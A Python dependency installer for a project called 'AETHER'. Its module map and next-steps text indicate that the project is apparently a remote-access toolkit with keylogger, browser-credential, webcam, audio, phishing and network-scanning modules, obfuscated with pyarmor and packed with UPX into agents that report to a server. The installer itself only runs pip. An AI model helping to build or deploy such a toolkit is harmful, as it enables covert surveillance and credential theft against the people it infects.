#!/usr/bin/env python3
"""
AETHER Universal Dependency Installer
Installs all required and optional dependencies for the project.
"""
import sys
import os
import platform
import subprocess
import importlib
import json
from pathlib import Path

class DependencyInstaller:
    def __init__(self):
        self.os_name = platform.system()
        self.is_windows = self.os_name == 'Windows'
        self.is_linux = self.os_name == 'Linux'
        self.is_mac = self.os_name == 'Darwin'
        self.python_version = sys.version_info
        
        # Color codes for output
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.RED = '\033[91m'
        self.BLUE = '\033[94m'
        self.RESET = '\033[0m'
        
        # Core dependencies (always required)
        self.core_deps = [
            'cryptography>=3.4',
            'requests>=2.25',
            'pillow>=8.0',  # PIL
            'psutil>=5.8',
            'colorama>=0.4',
            'pycryptodome>=3.10',  # Crypto module
            'dnspython>=2.1',  # DNS for communicator
            'python-dateutil>=2.8',
        ]
        
        # Windows-specific dependencies
        self.windows_deps = [
            'pywin32>=300',  # Windows API
            'wmi>=1.5',  # Windows Management
            'comtypes>=1.1',  # COM support
            'pypiwin32',  # Additional Windows APIs
        ]
        
        # Optional/Enhanced functionality
        self.optional_deps = [
            'pyautogui>=0.9',  # Screenshot automation
            'pyaudio>=0.2',  # Audio recording
            'opencv-python>=4.5',  # Webcam/advanced imaging
            'numpy>=1.19',  # For AI/advanced modules
            'scikit-learn>=0.24',  # AI module
            'pandas>=1.2',  # Data processing
            'pyreadline>=2.1',  # CLI enhancements (Windows)
            'pyinstaller>=4.0',  # Compilation
            'pyarmor>=7.0',  # Obfuscation
            'upx>=1.0',  # Compression (handled separately)
            'pygetwindow>=0.0.9',  # Window management
            'pyrect>=0.2',  # Rectangle/region handling
            'pytesseract>=0.3',  # OCR
            'pynput>=1.7',  # Input monitoring
            'sounddevice>=0.4',  # Audio
            'speechrecognition>=3.8',  # Voice
            'telebot>=0.0.4',  # Telegram bridge
            'scapy>=2.4',  # Network scanning
            'python-nmap>=0.7',  # Nmap integration
            'netifaces>=0.11',  # Network interfaces
            'icoextract>=0.1',  # Icon extraction
        ]
        
        # Agent-specific (for compilation/runtime)
        self.agent_deps = [
            'pyinstaller',
            'pyarmor',
            'pycryptodome',
            'cryptography',
            'requests',
            'pillow',
            'pyautogui',
            'pyaudio',
            'wmi',
            'pywin32',
            'psutil',
            'dnspython',
            'colorama',
        ]
        
        # Server-specific
        self.server_deps = [
            'colorama',
            'cryptography',
            'dnspython',
        ]
        
        # Module-specific dependencies mapping
        self.module_deps = {
            'browser.py': ['pycryptodome', 'cryptography'],
            'webcam.py': ['opencv-python', 'numpy'],
            'ai.py': ['scikit-learn', 'numpy', 'pandas'],
            'phishing.py': ['requests'],
            'scanner.py': ['scapy', 'python-nmap'],
            'keylogger.py': ['pynput'],
            'audio.py': ['pyaudio', 'sounddevice'],
        }
        
    def print_header(self, text):
        """Print formatted header."""
        print(f"\n{self.BLUE}{'='*60}{self.RESET}")
        print(f"{self.BLUE}{text:^60}{self.RESET}")
        print(f"{self.BLUE}{'='*60}{self.RESET}")
    
    def print_status(self, text, status="info"):
        """Print status message with color."""
        if status == "success":
            print(f"{self.GREEN}[✓] {text}{self.RESET}")
        elif status == "warning":
            print(f"{self.YELLOW}[!] {text}{self.RESET}")
        elif status == "error":
            print(f"{self.RED}[✗] {text}{self.RESET}")
        else:
            print(f"[*] {text}")
    
    def run_command(self, cmd, description=""):
        """Run a shell command and handle output."""
        if description:
            self.print_status(description)
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                check=False
            )
            
            if result.returncode == 0:
                if result.stdout.strip():
                    for line in result.stdout.strip().split('\n'):
                        if line and not line.startswith('Requirement'):
                            self.print_status(f"  {line}", "success")
                return True
            else:
                error_msg = result.stderr.strip() or result.stdout.strip()
                if "already satisfied" in error_msg.lower():
                    self.print_status("Already installed", "success")
                    return True
                else:
                    self.print_status(f"Error: {error_msg[:100]}", "error")
                    return False
                    
        except Exception as e:
            self.print_status(f"Command failed: {e}", "error")
            return False
    
    def check_import(self, module_name):
        """Check if a module can be imported."""
        try:
            # Handle special cases
            if module_name == 'PIL':
                module_name = 'PIL.Image'
            elif module_name == 'Crypto':
                module_name = 'Crypto.Cipher'
            elif module_name == 'win32api':
                module_name = 'win32con'  # Test any pywin32 module
            
            importlib.import_module(module_name)
            return True
        except ImportError:
            return False
        except Exception:
            # Some modules import but have runtime errors
            return False
    
    def install_pip(self):
        """Ensure pip is available and updated."""
        self.print_header("SETTING UP PIP")
        
        # Upgrade pip
        self.run_command(
            f'"{sys.executable}" -m pip install --upgrade pip',
            "Upgrading pip..."
        )
        
        # Install setuptools and wheel
        self.run_command(
            f'"{sys.executable}" -m pip install --upgrade setuptools wheel',
            "Installing build tools..."
        )
    
    def install_core(self):
        """Install core dependencies."""
        self.print_header("INSTALLING CORE DEPENDENCIES")
        
        for dep in self.core_deps:
            dep_name = dep.split('>=')[0].split('[')[0]
            if self.check_import(dep_name):
                self.print_status(f"{dep_name} already installed", "success")
                continue
            
            self.run_command(
                f'"{sys.executable}" -m pip install "{dep}"',
                f"Installing {dep_name}..."
            )
    
    def install_windows_specific(self):
        """Install Windows-specific dependencies."""
        if not self.is_windows:
            self.print_status("Skipping Windows-specific dependencies", "warning")
            return
        
        self.print_header("INSTALLING WINDOWS DEPENDENCIES")
        
        # Special handling for pywin32
        if not self.check_import('win32api'):
            self.print_status("Installing pywin32 (may require admin)...", "warning")
            
            # Try multiple installation methods
            methods = [
                f'"{sys.executable}" -m pip install pywin32',
                f'"{sys.executable}" -m pip install pypiwin32',
            ]
            
            success = False
            for cmd in methods:
                if self.run_command(cmd, "Trying pywin32 installation..."):
                    success = True
                    break
            
            if not success:
                self.print_status("PyWin32 installation may require:", "warning")
                self.print_status("  1. Run as administrator", "warning")
                self.print_status("  2. Or: download from https://github.com/mhammond/pywin32", "warning")
        
        # Install other Windows deps
        for dep in self.windows_deps:
            dep_name = dep.split('>=')[0]
            if dep_name in ['pywin32', 'pypiwin32']:
                continue  # Already handled
            
            if self.check_import(dep_name):
                self.print_status(f"{dep_name} already installed", "success")
                continue
            
            self.run_command(
                f'"{sys.executable}" -m pip install "{dep}"',
                f"Installing {dep_name}..."
            )
        
        # Fix pyreadline compatibility issue for Python 3.13+
        if self.python_version >= (3, 13) and self.check_import('pyreadline'):
            self.fix_pyreadline()
    
    def fix_pyreadline(self):
        """Fix pyreadline compatibility for Python 3.13+."""
        try:
            import pyreadline
            pyreadline_path = Path(pyreadline.__file__).parent
            
            compat_file = pyreadline_path / 'py3k_compat.py'
            if compat_file.exists():
                with open(compat_file, 'r') as f:
                    content = f.read()
                
                # Fix collections.Callable reference
                if 'collections.Callable' in content and 'collections.abc' not in content:
                    self.print_status("Fixing pyreadline compatibility...", "warning")
                    content = content.replace(
                        'collections.Callable',
                        'collections.abc.Callable'
                    )
                    
                    with open(compat_file, 'w') as f:
                        f.write(content)
                    
                    self.print_status("Pyreadline compatibility fixed", "success")
        except Exception as e:
            self.print_status(f"Could not fix pyreadline: {e}", "warning")
    
    def install_optional(self):
        """Install optional dependencies."""
        self.print_header("INSTALLING OPTIONAL DEPENDENCIES")
        
        self.print_status("Checking which optional features are needed...")
        
        # Check project structure to determine what's needed
        agent_dir = Path('agent') if Path('agent').exists() else Path('../agent')
        modules_needed = set()
        
        if agent_dir.exists():
            # Scan for module files to determine dependencies
            for root, dirs, files in os.walk(agent_dir):
                for file in files:
                    if file.endswith('.py'):
                        for module, deps in self.module_deps.items():
                            if module in file:
                                modules_needed.update(deps)
        
        # Always install these commonly used optional deps
        common_optional = ['pyautogui', 'pyaudio', 'numpy', 'pyinstaller']
        
        all_optional = set(common_optional) | modules_needed
        
        for dep in self.optional_deps:
            dep_name = dep.split('>=')[0].split('[')[0]
            
            # Skip if not in needed modules (unless user wants all)
            if len(sys.argv) > 1 and '--all' in sys.argv:
                pass  # Install everything
            elif dep_name not in all_optional:
                continue
            
            if self.check_import(dep_name):
                self.print_status(f"{dep_name} already installed", "success")
                continue
            
            self.run_command(
                f'"{sys.executable}" -m pip install "{dep}"',
                f"Installing {dep_name}..."
            )
    
    def install_upx(self):
        """Install or guide UPX installation."""
        self.print_header("UPX COMPRESSION TOOL")
        
        upx_installed = False
        
        if self.is_windows:
            # Check if UPX is in PATH
            try:
                subprocess.run(['upx', '--version'], capture_output=True, check=True)
                upx_installed = True
            except (FileNotFoundError, subprocess.CalledProcessError):
                pass
            
            if not upx_installed:
                self.print_status("UPX recommended for executable compression:", "warning")
                self.print_status("Download from: https://github.com/upx/upx/releases", "warning")
                self.print_status("Add upx.exe to PATH or place in project directory", "warning")
        else:
            # Linux/Mac - try to install via package manager
            self.print_status("On Linux/Mac, install UPX via package manager:", "warning")
            self.print_status("  Ubuntu/Debian: sudo apt-get install upx", "warning")
            self.print_status("  Mac: brew install upx", "warning")
    
    def generate_requirements(self):
        """Generate requirements.txt file."""
        self.print_header("GENERATING REQUIREMENTS.TXT")
        
        # Get currently installed packages
        try:
            result = subprocess.run(
                f'"{sys.executable}" -m pip freeze',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            
            installed = result.stdout.strip().split('\n')
            
            # Filter to project-relevant packages
            relevant_packages = []
            all_dep_names = []
            
            for deps in [self.core_deps, self.windows_deps, self.optional_deps]:
                for dep in deps:
                    all_dep_names.append(dep.split('>=')[0].split('[')[0].lower())
            
            for package in installed:
                if package and '==' in package:
                    pkg_name = package.split('==')[0].lower()
                    if pkg_name in all_dep_names:
                        relevant_packages.append(package)
            
            # Write requirements.txt
            with open('requirements.txt', 'w') as f:
                f.write('# AETHER Project Dependencies\n')
                f.write('# Generated by install_deps.py\n\n')
                for pkg in sorted(relevant_packages):
                    f.write(f'{pkg}\n')
            
            self.print_status(f"Generated requirements.txt ({len(relevant_packages)} packages)", "success")
            
        except Exception as e:
            self.print_status(f"Could not generate requirements: {e}", "warning")
    
    def verify_installation(self):
        """Verify all critical dependencies are installed."""
        self.print_header("VERIFICATION")
        
        critical_modules = [
            'cryptography',  # Encryption
            'requests',      # HTTP
            'psutil',        # System info
            'pycryptodome',  # Crypto
            'dnspython',     # DNS
        ]
        
        if self.is_windows:
            critical_modules.extend(['wmi', 'pywin32'])
        
        all_ok = True
        for module in critical_modules:
            if self.check_import(module):
                self.print_status(f"{module:20} ✓", "success")
            else:
                self.print_status(f"{module:20} ✗", "error")
                all_ok = False
        
        if all_ok:
            self.print_status("\nAll critical dependencies installed successfully!", "success")
        else:
            self.print_status("\nSome dependencies failed to install.", "warning")
            self.print_status("Try running with administrator privileges.", "warning")
        
        return all_ok
    
    def install_all(self):
        """Run full installation process."""
        self.print_header("AETHER UNIVERSAL DEPENDENCY INSTALLER")
        self.print_status(f"Python {self.python_version[0]}.{self.python_version[1]}.{self.python_version[2]} on {self.os_name}")
        self.print_status(f"Working directory: {os.getcwd()}")
        
        try:
            # 1. Setup pip
            self.install_pip()
            
            # 2. Install core dependencies
            self.install_core()
            
            # 3. Install OS-specific
            if self.is_windows:
                self.install_windows_specific()
            
            # 4. Install optional
            self.install_optional()
            
            # 5. UPX guidance
            self.install_upx()
            
            # 6. Generate requirements
            self.generate_requirements()
            
            # 7. Verify
            success = self.verify_installation()
            
            if success:
                self.print_header("INSTALLATION COMPLETE")
                self.print_status("Next steps:", "success")
                self.print_status("  1. Review config.json for your settings")
                self.print_status("  2. Generate SSL certs for HTTPS")
                self.print_status("  3. Run: python server/aether_server.py")
                self.print_status("  4. Compile agents: python builder/compile.py")
            else:
                self.print_header("INSTALLATION PARTIALLY COMPLETE")
                self.print_status("Some dependencies may need manual installation.", "warning")
            
            return success
            
        except KeyboardInterrupt:
            self.print_status("\nInstallation interrupted by user.", "error")
            return False
        except Exception as e:
            self.print_status(f"Unexpected error: {e}", "error")
            return False

def main():
    """Main entry point."""
    installer = DependencyInstaller()
    
    # Parse arguments
    if '--help' in sys.argv or '-h' in sys.argv:
        print("AETHER Dependency Installer")
        print("Usage: python install_deps.py [options]")
        print("\nOptions:")
        print("  --all     Install all optional dependencies")
        print("  --core    Install only core dependencies")
        print("  --verify  Only verify current installation")
        print("  --help    Show this help")
        return
    
    if '--verify' in sys.argv:
        installer.verify_installation()
        return
    
    if '--core' in sys.argv:
        installer.install_pip()
        installer.install_core()
        if installer.is_windows:
            installer.install_windows_specific()
        installer.verify_installation()
        return
    
    # Full installation
    success = installer.install_all()
    
    # Exit with appropriate code
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()